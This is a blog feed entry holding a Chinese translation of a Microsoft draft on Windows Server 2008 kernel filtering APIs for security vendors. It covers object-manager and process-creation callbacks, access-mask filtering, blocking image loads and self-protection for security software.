    <published>2017-05-23T09:55:21.000Z</published>
    <updated>2020-02-15T07:54:24.192Z</updated>
    <content type="html"><![CDATA[<h2 id="1-介绍">1.介绍</h2><p>这仅仅是一份供接受审阅和反馈的初稿。收到独立软件开发商的反馈后，一些内容和函数可能会改变。此外，这份文档仅限于适用Microsoft Windows Server® 2008。这些API是根据ISV社区讨论确定的，按照<a href="https://www.microsoft.com/downloads/details.aspx?FamilyId=4C7561E6-6F9D-4125-8A8C-AEAF8E3342B9&amp;displaylang=en" target="_blank" rel="external">Kernel Evaluation Criteria</a>。<br>很多系统管理安全类应用程序都需要访问内核信息及过滤系统调用的能力，其中一些操作涉及一些进程、线程对象。之前，当第三方软件开发商（ISV）想实现监控/修改/阻断操作时，但操作系统现有提供的过滤回调不支持时，他们一般采用的方式为挂钩在内核服务表（SSDT）中这些内核对象管理（OB）的API。提供官方支持的文档及过滤和访问内核信息的接口有利于操作系统平台，因为挂钩SSDT从来没有官方支持过并且可能会影响操作系统的稳定性。此外，随着在x64平台采用内核补丁保护技术（KPP）,在x64平台，ISV不能像32位x86平台中那样使用SSDT Hook了。<br><a id="more"></a></p>
<h2 id="2-范围">2.范围</h2><p>在过去几个月已经和一些ISV举行了多次电话和当面的会议，了解ISV的具体需求，主要是对操作系统的安全管控能力。这份文档反应了当前最紧迫的需求，这些都是基于和几十个安全软件开发商讨论得来的。<br>和ISV讨论确定的主要几个方面的内容如下：</p>
<ul>
<li>控制进程/线程的创建和打开</li>
<li>内存访问控制</li>
<li>控制可行性文件的加载</li>
<li>安全类软件进程的自保护<br>每一个方面都将在本文档中介绍。</li>
</ul>
<h2 id="3-定义和假设">3.定义和假设</h2><p>本文档假定读者熟悉当前注册表和文件系统的过滤模型。<br>KPP-内核补丁保护（Kernel Patch Protection）<br>OB-内核对象管理（Object Manager）<br>PS-进程管理（Process Management）<br>SSDT-系统服务调度表（System Service Dispatch Table）<br>WHQL-Windows硬件实验室（Windows Hardware Quality Labs）</p>
<h2 id="4-要求和约束">4.要求和约束</h2><p>为减少恶意代码滥用这些API的可能，要使用这些API必须要满足几个条件并且在API中可能会设置几个过滤级别。<br>在32位和64位系统上，内核驱动软件要使用这些新API必须有电子签名，可以在一定程度上区分程序并保证程序的完整性。同样如果这个内核驱动还有用户模式程序为内核软件提供配置和策略，用户模式软件也必须有电子签名。在x64平台，代码的数字签名需要和强制Authenticode签名一致。这个过程目前不需要WHQL认证-ISV可以直接为他们的代码前面不需要提交给微软。</p>
<ul>
<li>ISV所有的内核模式和用户模式的模块链接时必须设置/integritycheck标志位，这样内存管理器就会在模块加载时对其引用的代码强制执行签名检查。在最近版本的Microsoft Visual Studio® linker都可以进行设置。如果ISV想使用自定义工具链接或则修改二进制文件的话，只需要将PE头中的OptionalHeader.DllCharacteristics标志位IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY (0x0800)设置为ON即可。</li>
<li>被数字签名的用户模式和内核模式模块必须有cryptographic per-page hash catalogs，可以通过signtool工具/PH命令行生成。</li>
<li>下面的链接包含有关代码签名更多的信息，这些对于加载x64模式代码是必须的：<a href="https://www.microsoft.com/whdc/winlogo/drvsign/drvsign.mspx" target="_blank" rel="external">https://www.microsoft.com/whdc/winlogo/drvsign/drvsign.mspx</a><br>如果ISV使用用户模式下的服务去配置和控制使用新API模式的内核驱动模块，那服务必须使用Windows Vista新的服务框架。这样可以使服务使用最小特权原则，除此之外还运行ISV管理谁将能够赋予权限去访问服务/内核驱动的特定资源。例如，如果使用新的增强服务框架将可以设置为只有ISV提供的用户模式服务才能使用驱动的IOCTL接口进行控制。</li>
<li>在microsoft.com上有关于新的增强服务框架接口的白皮书：<a href="http://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/Vista_Services.doc" target="_blank" rel="external">http://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/Vista_Services.doc</a><br>任何一个用户态的系统服务也应该拥有电子签名。<br>ISV提供的回调函数入口点必须位于ISV具有电子签名的驱动程序代码段中。不允许提供的回调函数在动态分配的内存中。<br>对OB过滤回调，建议设计时使用等待和触发事件；这很重要因为任何OB调用都是在单独线程之外完成的。也可以事件同步调用，但是请注意当大量的冗长的同步等待会使工作线程延迟从而影响程序和系统的性能。ISV同时应该考虑使用超时机制在回调等待操作时。为了避免造成死锁，应该尽量减少在回调函数中进程操作的数量。对于需要等待状态改变的操作（eg 轮询等待策略变化），应该将这个事件设置为异步并将其转移到用户模式服务中执行。<br>当在错误执行条件下，决定首选的操作这是ISV的责任。例如当遇到内存不足的情况下，ISV可能会选择关闭安全功能或则打开失败（在检测到错误时，可以允许或则延迟操作）。请注意操作系统将不会决定这些，ISV需要面对失败情况下下各种可能的不同，或则基于安全策略。出于描述的目的，在ISV的回调函数处理的过程中需要面临内存不足的情况。下面是两种可能的处理方式：</li>
<li>ISV选择安全让操作失败。对于OB回调，ISV可能会过滤掉一些特定的操作。对PS回调，ISV可能会选择阻止进程创建操作。</li>
<li>ISV选择让执行继续执行成功。在这种特殊情况下，ISV不会执行过滤或则阻止操作，而是可以选择记录这个操作并警告用户。这个警告可能需要排队/延迟直到内存不足得以解决。<br>管理员用户必须能够发现使用这些API的程序。同时必须支持卸载，通过枚举内核驱动模块时必须能被发现。<br>不能创建一个对管理员不可见的进程或资源。例如所有的进程都必须在任务管理器中可见。<br>必须可以执行安全扫描和合规性检查操作（例如病毒扫描/完整性扫描等）对使用新API的代码，也包含被新API影响的进程和代码。<br>增强版的API可能会晚于Windows Server 2008，包括用于代码签名需要更高要求的认证（如EV代码签名），以及其他代码签名的实施和关联安全软件。ISV将会得到通知，并在发布之前有机会反馈评价。<br>其他API使用的标准文档也将在“Kernel Evaluation Criteria”文档中由Microsoft发布。</li>
</ul>
<h2 id="5-控制创建和打开进程/线程操作">5.控制创建和打开进程/线程操作</h2><p>高优先级ISV提出需要可以阻止或则过滤DesiredAccess属性的能力对打开句柄这个操作。在执行打开操作时过滤DesiredAccess属性可以阻止其他API调用去获得对象的句柄。涉及到的对象管理器中的API中包括OpenProcess、DuplicateHandle以及进程管理器中这些API的增强型API。</p>
<h3 id="5-1-OB过滤概述">5.1.OB过滤概述</h3><p>为了能够支持现有的安全和管理软件，对象管理器需要提供新的回调对特定的对象执行过滤操作。本节剩下的部分将会将会简单介绍新过滤机制的范围及支持的对象和过滤操作。文档附录中包含详细的关于具体的数据结构和OB过滤API的相关定义。<br>OB过滤模型将会支持：</p>
<ul>
<li><strong>分层模型允许多个过滤驱动共存：</strong> OB过滤管理器允许同时注册多个过滤驱动。对一个给定的驱动程序，其他层的驱动对其是透明的，各个过滤层之间可以无缝转换（所有的操作都会经过OB子系统）。</li>
<li><strong>可以修改OpenProcess和OpenThread的调用参数：</strong> 过滤驱动程序能够拦截OpenThread和OpenProcess的调用并在将调用传递到下一层之前修改DesiredAccess参数。允许过滤驱动调用者减少打开进程或则线程对象的句柄访问权限，具有阻止特定打开操作的功能。注意这不能完全去阻止打开操作；这就避免一些不可知而失败的情况在现有的系统中，如第4节中提到的（请参阅其他章节关于修改DesiredAccess获得更多信息）。</li>
<li><strong>禁止重复进入回调函数：</strong> 禁止使回调调用（直接/间接）重复进入回调。</li>
</ul>
<h3 id="5-2-OB框架概述">5.2.OB框架概述</h3><h4 id="5-2-1-回调注册">5.2.1.回调注册</h4><p>驱动程序能够通过ObRegisterCallbacks注册回调。OB公开的altitude值过滤模型体系结构将会和现有的文件/注册表过滤模型保持一致，将具有以下属性：</p>
<ul>
<li><strong>在注册回调函数过程中将会在在回调函数栈中生成唯一标识，altitude值：</strong> altitude值越高距离回调函数被调用越远。</li>
<li><strong>不能两个注册的回调函数具有相同的altitude值：</strong> 第一个注册的altitude值的驱动将会注册成功，其他注册同样altitude值得将会失败。注意OB过滤管理器将不会对altitude值拥有者做任何验证。</li>
<li><strong>Pre和Post注册（操作前和操作后）：</strong> 驱动程序可以同时注册Pre和Post操作通知，也可以选择其中一个进行注册。</li>
<li><strong>同时注册回调函数的数量没有上限：</strong> Altitudes值通常属于预先定义的一个altitude类别中（文件系统团队已经定义了一个可以覆盖大多数场景的集合）。为了将来能够对给定的类别大小进行扩展，altitude值是一个实数（离散的），使用字符串表示。altitude值可能会包含小数点（虽然预期不是这样的）。例如一个回调注册的altitude值为1.11，这个值在回调函数栈中将会比1.1更高。同样地根据未来的需要categories可以被增加和删除</li>
<li><strong>同时支持多altitudes值：</strong> 相同的回调函数可以同时使用多个altitudes值。</li>
<li><strong>每个对象类型都可以注册回调函数：</strong> 驱动程序可以注册为任何支持的操作（目前支持的操作包括创建句柄/打开句柄/复制句柄）的类型（目前支持的object类型包括进程和线程）的组合注册回调函数。<br>现有的过滤框架模型需要ISV在过滤回调函数栈上请求特定的altitude值。ISV用于在文件系统/注册表注册和获取altitude值（<a href="http://whdc.microsoft.com/minifilter/default.aspx）已经被扩展并且支持OB过滤了。一旦ISV通过上面的注册网站提交一个特定的altitude请求，微软会根据他们的请求去分配一个唯一的altitude值从现有的categories中（或则创建一个之前未存在的新值）。" target="_blank" rel="external">http://whdc.microsoft.com/minifilter/default.aspx）已经被扩展并且支持OB过滤了。一旦ISV通过上面的注册网站提交一个特定的altitude请求，微软会根据他们的请求去分配一个唯一的altitude值从现有的categories中（或则创建一个之前未存在的新值）。</a><br>可以通过调用ObUnRegisterCallbacks取消回调注册。OB管理器会在回调函数被取消之前保证所有的回调函数已经执行完毕。<br>驱动的责任是调用ObRegisterCallbacks并在驱动卸载之前调用ObUnRegisterCallbacks。<br><strong>ObRegisterCallbacks</strong><br>ObRegisterCallbacks函数可以添加驱动程序提供的回调函数到一个函数列表中，这个函数列表中的函数会在进程/线程被创建/打开时被调用。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span><br><span class="line"><span class="title">ObRegisterCallbacks</span> <span class="params">(</span><br><span class="line">IN POB_CALLBACK_REGISTRATION CallBackRegistration,</span><br><span class="line">OUT PVOID *RegistrationHandle</span><br><span class="line">)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><strong>参数：</strong></p>
<ul>
<li>CallBackRegistration：指向注册结构的指针，其中包含用于注册回调的信息，包括filter altitude、registration context和一个包含回掉函数的数组。所提供的回调函数地址必须位于拥有有效数字签名的内核驱动程序代码段位置，回调函数地址不允许位于非分页内存或则其他动态分配的内存中。</li>
<li>RegistrationHandle:一个PVOID类型指针，接受一个标识该注册的实例句柄，当取消该回调时作为ObUnRegisterCallbacks的参数。<br><strong>返回值：</strong><br>ObRegisterCallbacks可能的返回值如下：</li>
<li>ObRegisterCallbacks 回调函数在系统中注册成功。</li>
<li>STATUS_FLT_INSTANCE_ALTITUDE_COLLISION 调用的驱动程序或则其他驱动程序已经注册了相同的altitude值，注册失败。</li>
<li>STATUS_INVALID_PARAMETER 本次注册中一个或者多个参数无效。例如制定了不正确的版本或则注册了不支持的回调函数类型都可能返回这个错误。</li>
<li>STATUS_INSUFFICIENT_RESOURCES 分配内存过程中失败。回调函数<br><strong>头文件：</strong><br>在TBD中声明<br><strong>备注：</strong><br>ObRegisterCallbacks函数只在Microsoft Windows Server 2008及以后的版本提供支持。在驱动卸载之前，驱动程序必须注销掉所有回调函数的注册，可以通过ObUnRegisterCallbacks取消注册。<br><strong>ObUnRegisterCallbacks</strong><br>ObUnRegisterCallbacks函数用于取消ObRegisterCallbacks注册的回调函数。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID</span><br><span class="line"><span class="title">ObUnRegisterCallbacks</span> <span class="params">(</span><br><span class="line">IN PVOID RegistrationHandle</span><br><span class="line">)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><strong>参数：</strong></p>
<ul>
<li>RegistrationHandle：一个PVOID类型指针，指向回调函数注册的句柄实例。ObRegisterCallbacks调用后返回的一个值。<br><strong>返回值：</strong><br>无</li>
</ul>
<h4 id="5-2-2_回调函数调用">5.2.2 回调函数调用</h4><p>过滤管理器通过在栈上顺序传递通知的方式实现分层操作。由于过滤管理器会通知每一个已经注册了回调函数的驱动程序，从一个具体的回调函数来看，在回调函数栈上的其他函数都是被过滤管理器逻辑抽象的，对其是透明的。</p>
<h5 id="5-2-2-1_回掉函数">5.2.2.1 回掉函数</h5><p>pre预通知回调会在实际行为完成之前被OB管理器调用，post后通知回调会在实际行为完成之后被返回给调用者之前被OB管理器调用。<br>Post后通知回调函数仅仅起到一个信息传递的作用，行为的返回值或则参数改变都不会有任何效果。</p>
<h5 id="5-2-2-2_运行方式">5.2.2.2 运行方式</h5><p>过滤器既可以修改行为参数也可以起监控作用。过滤器会在回调函数栈中传递相同的内存信息，只有在调用实际的API之前修改参数信息才会有效果。Pre预通知回调函数必须返回OB_PREOP_SUCCESS状态。</p>
<h5 id="5-2-2-3_回调上下文Callback_Context">5.2.2.3 回调上下文Callback Context</h5><p>过滤模型还支持通过回调上下文（context）将每个预回调pre通知及后回调post通知关联起来。这通过在回调通知结构体中包含一个CallContext实现。每个驱动程序都可以在这里存储特定的context。因为当遍历调用回调函数栈中的回调函数时，context会改变，因此过滤管理器必须包含pre回调通知和post回调通知是相同的context。<br>下面将会描述回调上下文和回调函数相关的东西：<br>OB OPEN_HANDLE将会被OB Create_Handle处理。<br><strong>OB CREATE_HANDLE</strong>:</p>
<ul>
<li>Callback context:通知函数将会在源进程和线程的上下文空间被调用和执行。</li>
<li>Originating (calling) Process and Thread:PsGetCurrentProcess,PsGetCurrentProcessId, PsGetCurrentThread, PsGetCurrentThreadId可以正常使用。</li>
<li>Process or Thread to be created:进程或则线程的对象指针将会被创建或打开在OB_PRE_CREATE_HANDLE_INFORMATION。</li>
<li>注意：OB函数对象是非公开类型，因此虽然有对象指针但是并不是由id的对象，非ProcessIB或ThreadID。<br><strong>OB DUPLICATE_HANDLE：</strong></li>
<li>Callback context:通知函数将会在源进程和线程的上下文空间被调用和执行。</li>
<li>Originating (calling) Process and Thread:PsGetCurrentProcess,PsGetCurrentProcessId, PsGetCurrentThread, PsGetCurrentThreadId可以正常使用。</li>
<li>Process or Thread handle to be duplicated:进程或则线程的对象指针将会被复制由源程序在OB_PRE_DUPLICATE_HANDLE_INFORMATION结构体中提供。</li>
<li>注意：目标进程将会获得复制的句柄由源程序的OB_PRE_DUPLICATE_HANDLE_INFORMATION结构体。<br><strong>预pre回掉函数：</strong><br>驱动的预回调函数可以用于监控或则修改对象的行为。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">OB_PREOP_CALLBACK_STATUS</span></span><br><span class="line"><span class="params">( *POB_PRE_OPERATION_CALLBACK)</span> <span class="params">(</span><br><span class="line">__IN PVOID RegistrationContext,</span><br><span class="line">__INOUT POB_PRE_OPERATION_INFORMATION OperationInformation</span><br><span class="line">)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><strong>参数：</strong></p>
<ul>
<li>RegistrationContext：驱动传入作为RegistrationContext参数（在注册结构OB_REGISTRATION中），这将允许context信息传递按altitude传递。</li>
<li>OperationInformation：一个指向包含操作类型的数据的指针，数字结构中也包含回调函数地址及一些回调函数可以修改的操作参数。<br><strong>返回值：</strong><br>一个枚举值，目前只支持OB_PREOP_SUCCESS。<br><strong>备注：</strong><br>为了获得进程/线程的通知，内核模块（如反病毒软件的驱动程序）需要调用ObRegisterCallbacks去为这个操作注册回调函数。<br>OB回调函数总是在源进程/线程的上下文中调用执行。<br><strong>后post回调函数：</strong><br>驱动可以通过后回调函数监控对象操作。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span></span><br><span class="line"><span class="params">( *POB_POST_OPERATION_CALLBACK)</span> <span class="params">(</span><br><span class="line">__IN PVOID RegistrationContext,</span><br><span class="line">__IN POB_POST_OPERATION_INFORMATION OperationInformation</span><br><span class="line">)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><strong>参数：</strong></p>
<ul>
<li>RegistrationContext：驱动传入作为RegistrationContext参数（在注册结构OB_REGISTRATION中），这将允许context信息传递按altitude传递。</li>
<li>OperationInformation：一个指向包含操作类型的数据的指针，还包含与当前操作相关的参数。<br><strong>返回值：</strong><br>无<br><strong>备注：</strong><br>为了获得进程/线程的通知，内核模块（如反病毒软件的驱动程序）需要调用ObRegisterCallbacks去为这个操作注册回调函数。<br>OB回调函数总是在源进程/线程的上下文中调用执行。</li>
</ul>
<h4 id="5-2-3_限制">5.2.3 限制</h4><p>在当前版本中，唯一可以修改的参数是DesiredAccess ACCESS_MASK（当操作是在修改模式），标识当前操作是创建/打开/复制进程/线程的句柄。此外，只能修改为请求传入参数ACCESS_MASK的子集。还保存了一个DesiredAccess原始请求只读的副本。如果原始调用来自内核模式，则参数可能不能被修改。</p>
<h3 id="5-3_PS进程扩展回调">5.3 PS进程扩展回调</h3><p>在进程创建过程中，增强型的进程创建回调将会带来更多的灵活性。在回调函数中将会提供更多的信息：完整的模块路径和命令行参数。除此之外，可以在回调函数中阻止进程创建，如使应用层代码无法运行。<br>与现有的系统一样，接受进程创建的回调函数也会收到进程终止回调。但是相反的并不成立，驱动可能会接受到一个线程或者进程的终止回调但是却不会收到创建回调。发生这种情况可能的情况为驱动在进程创建后才注册了进程回调函数或则上层接受到通知较早的驱动否决了进程的创建通知（通过返回值CREATE_PROCESS_NOTIFY_ROUTINE_EX），从而提前终止了通知的处理。<br>回调函数的数量限制也扩充了从目前的8个扩充到32个。<br>线程创建和终止回调仍然没有改变。<br>下面将会描述回调上下文及相关信息：<br><strong>PsSetCreateProcessNotifyRoutineEx</strong></p>
<ul>
<li>Callback context:回调函数在源进程或则线程的上下文中被调用或则执行（但是可能在未来的系统中发生变化）</li>
<li>Originating (calling) Process and Thread:ProcessID和ThreadID在PS_CREATE_NOTIFY_INFO参数中被提供。</li>
<li>Newly created Process:进程指针和新被创建的进程的ProcessID都会被通过参数传递到回调函数。</li>
<li>Process ParentID:通过PS_CREATE_NOTIFY_INFO结构作为参数传递。</li>
<li>Notes:在回调函数执行之前应用层代码将不会被执行。在回调函数已经执行完后才会为新进程创建初始线程。在Windows Server 2008，如果通知被其中一个回调函数否决掉，那么PsSetCreateProcessNotifyRoutines其他的回调函数将不会被执行。执行新创建函数的指针可以不必再回调中查找效率更高。<br><strong>PsSetCreateProcessNotifyRoutineEx (进程终止)</strong></li>
<li>Callback context:回调函数将会在最后一个线程和进程上下文中被执行。</li>
<li>Originating (calling) Process and Thread:不支持。</li>
<li>Newly created Process:进程指针和新被创建的进程的ProcessID都会被通过参数传递到回调函数。</li>
<li>Process ParentID:通过PS_CREATE_NOTIFY_INFO结构作为参数传递。</li>
<li>Notes:当最后一个线程/进程被标记为终止时，回调函数会被调用。在这个过程中没有办法阻止这个此时的终止。回调函数是在线程和进程被终止前被调用的（在这种意义上可以被称为PRE预回调），但是这个回调不能阻止这个进程/线程终止事件（在这种意义上类似后Post回调）。</li>
</ul>
<p><strong>PsSetCreateThreadNotifyRoutine</strong></p>
<ul>
<li>Callback context：回调函数将会在最后一个线程和进程上下文中被执行。</li>
<li>Originating (calling) Process and Thread:可以在回调函数中使用PsGetCurrentProcess,PsGetCurrentProcessId, PsGetCurrentThread, PsGetCurrentThreadId获得。</li>
<li>Newly created Thread:进程指针和新被创建的线程的ThreadID都会被通过参数传递到回调函数。</li>
<li>Notes:这个API在Windows Server 2008没有变化，相比之前。</li>
</ul>
<p><strong>PsSetCreateThreadNotifyRoutine（线程终止）</strong></p>
<ul>
<li>Callback context：回调函数将会在要终止的线程的上下文中执行。</li>
<li>Originating (calling) Process and Thread:不支持</li>
<li>Thread to be deleted: ProcessID和和将要终止线程的ThreadID会作为参数传递给回调函数。</li>
<li>Notes:这个API在Windows Server 2008没有变化，相比之前。<br><strong>PsSetCreateProcessNotifyRoutineEx</strong><br>PsSetCreateProcessNotifyRoutineEx函数可以将驱动提供的回调函数从进程被创建或则终止的函数列表中添加或则删除。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span><br><span class="line"><span class="title">PsSetCreateProcessNotifyRoutineEx</span><span class="params">(</span><br><span class="line">IN PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine,</span><br><span class="line">IN BOOLEAN Remove</span><br><span class="line">)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><strong>参数：</strong></p>
<ul>
<li>NotifyRoutine：指定进程创建回调函数的的入口点。</li>
<li>Remove：标识回调函数是被添加或则删除从系统回调函数列表中。如果为FALSE，指定的回调函数将会被添加，如果为TRUE,指定的回调函数将会从列表中被移除。<br><strong>返回值：</strong><br>PsSetCreateProcessNotifyRoutineEx的返回值是其中一个：</li>
<li>STATUS_SUCCESS：被给定的回调函数注册成功。</li>
<li>STATUS_INVALID_PARAMETER：给定的回调函数已经被注册，这是一个多余的注册。或则系统已经达到注册回调函数最大上限。<br><strong>备注：</strong><br>最高级别的驱动程序可以调用PsSetCreateProcessNotifyRoutineEx注册进程回调函数，回调函数声明如下：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VOID</span><br><span class="line">(*PCREATE_PROCESS_NOTIFY_ROUTINE_EX) (</span><br><span class="line">__inout PEPROCESS Process,</span><br><span class="line">__in HANDLE ProcessId,</span><br><span class="line">__in_opt PPS_CREATE_NOTIFY_INFO CreateInfo</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>进程句柄Process和进程ID ProcessID这两个参数都是识别新进程的参数，CreateInfo参数中包含有进程是创建函数终止的信息。<br>IFS或则高级别的系统优化驱动可能会注册进程创建回调函数去监控系统内部进程的创建和种植。系统中最多可以注册32个进程创建回调函数。<br>在驱动卸载的时候必须同时卸载注册的回调函数，可以通过调用PsSetCreateProcessNotifyEx且Remove参数设置为TRUE即可卸载回调函数。<br>CreateInfo的定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> _PS_CREATE_NOTIFY_INFO &#123;</span><br><span class="line">__in SIZE_T Size;</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">__in ULONG Flags;</span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">__in ULONG FileOpenNameAvailable : <span class="number">1</span>;</span><br><span class="line">__in ULONG Reserved : <span class="number">31</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">__in HANDLE ParentProcessId;</span><br><span class="line">__in CLIENT_ID CreatingThreadId;</span><br><span class="line">__inout <span class="keyword">struct</span> _FILE_OBJECT *FileObject;</span><br><span class="line">__in PCUNICODE_STRING ImageFileName;</span><br><span class="line">__in_opt PCUNICODE_STRING CommandLine;</span><br><span class="line">__out NTSTATUS CreationStatus;</span><br><span class="line">&#125; PS_CREATE_NOTIFY_INFO, *PPS_CREATE_NOTIFY_INFO;</span><br><span class="line"><span class="keyword">typedef</span> CONST PS_CREATE_NOTIFY_INFO *PCPS_CREATE_NOTIFY_INFO</span><br></pre></td></tr></table></figure></p>
<p>驱动回调函数被注册之后，在一个新进程初始线程被创建后回调函数会被调用并传入非空的CreateInfo信息并且包含ProcessId句柄。输入的ParentProcessId句柄可以标识新创建进程的父进程。注意父进程可能并不是正在创建该进程的进程，因为Windows Vista允许进程通过模板进程被创建（为了继承某些属性）。请注意驱动可以通过写入失败的NTSTATUS码到CreationStatus结构使内核停止新进程的创建。<br>进程回调函数也可以通过一个空的CreateInfo被调用，表示回调函数是被进程终止被条用。当进程中最后一个线程被终止时被调用，进程地址空间也即将被删除。<br>如果FileOpenNameAvailable被设置，ImageFileName这个UnicodeString参数是进程可执行文件的路径。如果标志位没有被设置，那么ImageFileName只是部分名称。在这两种情况下，同可以通过文件对象FileObject回溯到可执行文件的内存映射文件，驱动可以通过管理api类似FltGetFileNameInformationUnsafe获得更多属性信息。<br>调用PsSetCreateProcessNotifyRoutineEx中断级别必须是IRQL = PASSIVE_LEVEL。</p>
<h2 id="6-内存写访问控制">6.内存写访问控制</h2><p>在这个部分一些ISV请求能够获得能够屏蔽WriteProcessMemory()及相关API的能力。微软已经就这个问题进行了调查并和一些ISV进行了讨论。结论是并不需要提供更细粒度的API用于过滤WriteProcessMemory()。然而，微软提供了替代方案用于屏蔽WriteProcessMemory()操作的能力，在其他方面这种方案也可以提供支持，如在其他线程中创建远程线程。<br>有一系列的函数我们称之为“上游函数”，其他的称为“下游函数”。上游函数会将句柄返回给下游函数。例如，TerminateProcess()就是一个下游函数，TerminateProcess会依赖OpenProcess() 返回的带有PROCESS_TERMINATE权限的句柄。通过过滤上游函数OpenProcess()的DesiredAccess就可以有效控制下游函数，如CreateRemoteThread()、WriteProcessMemory()和 TerminateProcess()。<br>通过新的OB过滤框架过滤DesiredAccess属性为实现更高层次、更广范围控制提供了可能。一些和内存访问控制及进程/线程终止相关的DesiredAccess属性如下：</p>
<ul>
<li>PROCESS_VM_WRITE</li>
<li>PROCESS_VM_OPERATION</li>
<li>PROCESS_TERMINATE</li>
<li>THREAD_TERMINATE<br>为了维护查询和管理功能的可见性及可维护性，防止失控和防止恶意代码隐藏，查询操作不可能被过滤或则阻止，此外操作系统内核及内核模式驱动始终有能力终止系统上的任何进程。</li>
</ul>
<h2 id="7-加载可执行文件">7.加载可执行文件</h2><p>一些ISV有请求去屏蔽一些可执行文件的加载。目前发布的Windows系统支持映像加载回调通知（可以满足ISV一部分需求），但是没有提供屏蔽可执行文件加载功能。出于这个原因，微软调查了是否需要一个新的API去满足这项需求，但是最终得出的结论是现有的功能可以满足屏蔽模块加载功能。<br>mini-filter可以被用于阻止应用层（如DLL）和内核层（如驱动）的加载。拦截IRP_MJ_ACQUIRE_FOR_SECTION_SYNCHRONIZATION并返回STATUS_ACCESS_DENIED当区段被加载为PAGE_EXECUTE属性的时候。文件系统mini-filter已经被微软文档化，文档的白皮书<a href="http://download.microsoft.com/download/e/b/a/eba1050f-a31d-436b-9281-92cdfeae4b45/FilterDriverDeveloperGuide.doc。" target="_blank" rel="external">http://download.microsoft.com/download/e/b/a/eba1050f-a31d-436b-9281-92cdfeae4b45/FilterDriverDeveloperGuide.doc。</a><br>另一方面，微软正在调查除了Windows服务管理器之外使用未文档化和未官方支持的API NtLoadDriver()的情况。</p>
<h2 id="8-自保护">8.自保护</h2><p>进程的自保护是ISV提出的第二优先级需求。这一需求的来源来自于安全软件减少被恶意软件终止和干扰的机会。在几个案例中，ISV修补操作系统内核漏洞的唯一原因是实现安全软件的自我保护。微软对这一需求进行了调查并给出了结论，可以使用新的API和现有的API去实现包含安全软件在内的各种进程的保护。使用实例如下：</p>
<ul>
<li>新的进程和线程过滤API可用于防止进程被终止和波坏。</li>
<li>通过文件微过滤驱动可以控制代码被加载到安全软件中，可以阻止未知代码的加载。</li>
<li>通过现有的注册表回调可以保护注册表资源，可以保护安全软件的配置数据。</li>
<li>使用Windows的强化服务框架可以限制访问和权限保护安全软件服务。<br>Windows也调查了”受保护进程”这个概念，在第三方ISV的用途。这需要ISV去认证受保护的进程，以加强约束。操作系统内核会通过执行策略进行约束。这个特殊的需求支持将会在Windows Server 2008之后进行调研，通常这样的模式微软也是原因采纳的。这种模式可能需要在多版本发布时在特殊领域可以使用，最终可能会导致现有的内核函数被废弃。在这一领域的变化ISV会给予好评。</li>
</ul>
<h2 id="9-附录">9.附录</h2><h3 id="9-1_结构体定义">9.1 结构体定义</h3><p>略，详细内容参考msdn和<a href="https://vrtulex.net/download/ostatni/prirucky/kernel-data-filtering.pdf" target="_blank" rel="external">原文章</a></p>
<h3 id="9-2_DesiredAccess属性">9.2 DesiredAccess属性</h3><p>下面是列出了允许设置DesiredAccess属性的位，在Open/Duplicate回调函数中：<br>PROCESS_CREATE_PROCESS<br>PROCESS_CREATE_THREAD<br>PROCESS_DUP_HANDLE<br>PROCESS_SET_QUOTA<br>PROCESS_SET_INFORMATION<br>PROCESS_SUSPEND_RESUME<br>PROCESS_TERMINATE<br>PROCESS_VM_OPERATION<br>PROCESS_VM_WRITE<br>THREAD_DIRECT_IMPERSONATION<br>THREAD_IMPERSONATE<br>THREAD_SET_CONTEXT<br>THREAD_SET_INFORMATION<br>THREAD_SET_LIMITED_INFORMATION<br>THREAD_SET_THREAD_TOKEN<br>THREAD_SUSPEND_RESUME<br>THREAD_TERMINATE</p>
]]></content>
    <summary type="html">
